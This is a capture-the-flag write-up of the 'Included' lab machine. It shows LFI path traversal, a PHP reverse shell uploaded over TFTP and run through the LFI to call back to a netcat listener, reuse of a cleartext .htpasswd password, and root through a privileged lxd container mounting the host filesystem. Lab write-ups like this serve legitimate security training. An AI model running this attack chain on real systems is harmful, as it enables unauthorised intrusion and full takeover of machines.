# Included

---

## Setup

Connected to the VPN, spawned in the target machine, as a first step to make sure the target machine is alive I use a quit `ping` command in the terminal to make sure all is set and store the IP in an environment variable:

```shell
└─$ export IP=10.129.126.111
└─$ echo $IP
10.129.126.111

└─$ ping $IP                                                                          
PING 10.129.126.111 (10.129.126.111) 56(84) bytes of data.
64 bytes from 10.129.126.111: icmp_seq=1 ttl=63 time=68.6 ms
64 bytes from 10.129.126.111: icmp_seq=2 ttl=63 time=68.5 ms
64 bytes from 10.129.126.111: icmp_seq=3 ttl=63 time=68.5 ms
64 bytes from 10.129.126.111: icmp_seq=4 ttl=63 time=68.4 ms
````

All is set!

---

## Enumeration

First, I ran a scan on the target machine to identify open ports and running services that might be vulnerable using [nmap](https://nmap.org) with the following flags:
`-sV`: Determine running services/versions on open ports
`-sC`: Run default scripts
`-v`: Verbose output for more information about the scan
`-oN`: Write the output of the scan into a file

scan result:

```shell
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
| http-title: Site doesn't have a title (text/html; charset=UTF-8).
|_Requested resource was http://included.htb/?file=home.php
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
```

and the UDP Scan result:

```shell
Not shown: 998 closed udp ports (port-unreach)
PORT   STATE         SERVICE VERSION
68/udp open|filtered dhcpc
69/udp open|filtered tftp
```

There was port 80 TCP open which is HTTP web server. so I added the entry to my `/etc/hosts` file and navigated to the web application.

---

## Local File Inclusion (LFI) Attack

The first thing that caught my eyes almost immediately when I loaded the page `http://included.htb` is that I got redirected to `http://included.htb/?file=home.php` when I loaded in, that clicked in my head and I started testing some path traversing attemps and in worked right away! `http://included.htb/?file=../../../etc/passwd` returned the actual `/etc/passwd` file.

![Local file Inclusion test](https://imgur.com/Wl8Y82I.png)

so that's a perfect way to execute a payload that I upload in some other way. Also I noticed after quickly reading through this trying to identify in advance what's the username I'm targetting at first and I saw `Mike`, so that might be useful intel later on.

---

## TFTP

TFTP was the perfect way to upload a payload on the web server, I tried connecting using `tftp` in the terminal and I was in! so the steps to gain RCE on the target machine are as following:

1- Upload the payload
2- Start a listener
3- Execute the payload
4- Bingo

So I started by getting the payload ready, I used [revshells](https://www.revshells.com/) and saved it to `payload.php` after modifying the `LPORT` to 1337 and `LHOST` to my tun0 IP.

Then I uploaded the payload using `tftp`:

```shell
└─$ tftp
tftp> connect 10.129.126.111
tftp> status
Connected to 10.129.126.111.
Mode: netascii Verbose: off Tracing: off
Rexmt-interval: 5 seconds, Max-timeout: 25 seconds
tftp> put payload.php
Sent 2778 bytes in 0.5 seconds
tftp> 
```

Next I started a netcat listener on port `1337`:

```shell
└─$ nc -lvnp 1337
listening on [any] 1337 ...

```

with a quick google search to find where the payload was uploaded on the target machine, I found that the default TFTP folder is `/var/lib/tftpboot/`. now to execute the payload on the target machine, I went to my browser and navigated to `http://included.htb/?file=../../../var/lib/tftpboot/payload.php` and I established my netcat connection:

```shell
connect to [10.10.16.2] from (UNKNOWN) [10.129.126.111] 35556
Linux included 4.15.0-151-generic #157-Ubuntu SMP Fri Jul 9 23:07:57 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux
 06:02:40 up 35 min,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
bash: cannot set terminal process group (1571): Inappropriate ioctl for device
bash: no job control in this shell
www-data@included:/$ 
www-data@included:/$ python3 -c "import pty;pty.spawn('/bin/bash')"
<tml$ python3 -c "import pty;pty.spawn('/bin/bash')"
www-data@included:/$
```

And I got a fully interactive shell, now I need to at least get user privs in order to get the user flag since `www-data` has no permissions for anything, I kept cruising around the file system and evetually found `.htpasswd` file on the web server folder at `/var/www/html`.

```shell
www-data@included:/var/www/html$ ls -la
ls -la
total 88
drwxr-xr-x 4 root     root      4096 Oct 13  2021 .
drwxr-xr-x 3 root     root      4096 Apr 23  2021 ..
-rw-r--r-- 1 www-data www-data   212 Apr 23  2021 .htaccess
-rw-r--r-- 1 www-data www-data    17 Apr 23  2021 .htpasswd
-rw-r--r-- 1 www-data www-data 13828 Apr 29  2014 default.css
drwxr-xr-x 2 www-data www-data  4096 Apr 23  2021 fonts
-rw-r--r-- 1 www-data www-data 20448 Apr 29  2014 fonts.css
-rw-r--r-- 1 www-data www-data  3704 Oct 13  2021 home.php
drwxr-xr-x 2 www-data www-data  4096 Apr 23  2021 images
-rw-r--r-- 1 www-data www-data   145 Oct 13  2021 index.php
-rw-r--r-- 1 www-data www-data 17187 Apr 29  2014 license.txt
www-data@included:/var/www/html$ cat .htpasswd
cat .htpasswd
mike:Sheffield19
```

I got the creditials for the username `mike`, and hopefully he used this password for his user on this linux machine, most people do..

```shell
www-data@included:/var/www/html$ su mike
su mike
Password: Sheffield19

mike@included:/var/www/html$ 
```

Bingo, I got the user flag from `/home/mike/user.txt`.

---

## Privilege Escalation

I started the privilege escalation process by monitoring the running processes using `ps aux` and [pspy](https://github.com/DominicBreuker/pspy) but found nothing I can use, but after running [Linpeas](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS) I found that the user `mike` is a member of the group `lxd`.

After some googling, turns out that the group `lxd` is simply a management API that can manage LXC containers on linux machines and control multiple virtual machines at ones easily, and apparently It will perform ANY command for any member of the `lxd` group without any permissions requirements.

So I started digging deeper into this and I found a great [HackTrick article](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/interesting-groups-linux-pe/lxd-privilege-escalation) which says in the first line :
> If you belong to lxd or lxc group, you can become root.

---

## Alpine

I started first by installing the distro builder, these instructions can be found on [https://github.com/lxc/distrobuilder](https://github.com/lxc/distrobuilder) and the [HackTricks article](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/interesting-groups-linux-pe/lxd-privilege-escalation).

```shell
sudo su
sudo apt update
sudo apt install -y git golang-go debootstrap rsync gpg squashfs-tools
git clone https://github.com/lxc/distrobuilder
cd distrobuilder
make
mkdir -p $HOME/ContainerImages/alpine/
cd $HOME/ContainerImages/alpine/
wget https://raw.githubusercontent.com/lxc/lxc-ci/master/images/alpine.yaml
sudo $HOME/go/bin/distrobuilder build-lxd alpine.yaml -o image.release=3.8
```

Next step, I uploaded the image file to the target machine with a simple python http server.

```shell
└─$ python -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.129.126.111 - - [20/Sep/2022 02:57:52] "GET /lxd.tar.xz HTTP/1.1" 200 -
10.129.126.111 - - [20/Sep/2022 02:58:24] "GET /rootfs.squashfs HTTP/1.1" 200 -
```

Now to add the image on the target machine:

```shell
mike@included:~$ lxc image import lxd.tar.xz rootfs.squashfs --alias alpine
lxc image import lxd.tar.xz rootfs.squashfs --alias alpine
mike@included:~$ lxc image list
lxc image list
+--------+--------------+--------+----------------------------------------+--------+--------+------------------------------+
| ALIAS  | FINGERPRINT  | PUBLIC |              DESCRIPTION               |  ARCH  |  SIZE  |         UPLOAD DATE          |
+--------+--------------+--------+----------------------------------------+--------+--------+------------------------------+
| alpine | 29fb78ee1746 | no     | Alpinelinux 3.8 x86_64 (20220920_0656) | x86_64 | 1.96MB | Sep 20, 2022 at 6:58am (UTC) |
+--------+--------------+--------+----------------------------------------+--------+--------+------------------------------+
```

Now to add the container with the root path:

```shell
mike@included:~$ lxc init alpine privesc -c security.privileged=true 
lxc init alpine privesc -c security.privileged=true 
Creating privesc
mike@included:~$ lxc list
lxc list
+---------+---------+------+------+------------+-----------+----------+
|  NAME   |  STATE  | IPV4 | IPV6 |    TYPE    | SNAPSHOTS | LOCATION |
+---------+---------+------+------+------------+-----------+----------+
| privesc | STOPPED |      |      | PERSISTENT | 0         | included |
+---------+---------+------+------+------------+-----------+----------+
mike@included:~$ lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true
/root recursive=trued privesc host-root disk source=/ path=/mnt/
Device host-root added to privesc
```

Now execute the container and gain root access:

```shell
mike@included:~$ lxc start privesc
lxc start privesc
mike@included:~$ lxc exec privesc /bin/sh
lxc exec privesc /bin/sh
~ # ^[[39;5R

~ # ^[[39;5R whoami
whoami
root
```

I navigated through the image file system to `/mnt/root/root` and got the root flag.

---